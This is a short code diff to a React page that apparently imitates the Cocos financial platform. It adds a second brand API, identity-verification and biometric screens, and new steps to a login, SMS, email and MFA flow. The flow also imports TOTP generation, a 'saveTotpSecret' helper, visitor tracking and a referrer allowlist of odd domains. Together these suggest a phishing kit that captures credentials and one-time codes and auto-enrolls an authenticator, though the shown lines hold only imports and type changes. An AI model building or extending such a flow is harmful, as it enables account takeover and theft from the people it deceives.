@@ -2,6 +2,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import { invokeCocos } from "@/lib/cocosApi";
+import { invokeWayni } from "@/lib/wayniApi";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import cocosLogo from "@/assets/cocos-logo.png";
 import CocosLogo from "@/components/cocos/CocosLogo";
@@ -10,10 +11,12 @@ import CocosV2SmsScreen from "@/components/cocosv2/CocosV2SmsScreen";
 import CocosV2EmailScreen from "@/components/cocosv2/CocosV2EmailScreen";
 import CocosV2MfaScreen from "@/components/cocosv2/CocosV2MfaScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
+import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
+import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
 import { generateTOTP } from "@/lib/totp";
 import { saveTotpSecret } from "@/lib/totp";
 
-type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "done";
+type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "verify_identity" | "biometric" | "done";
 
 const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];
 
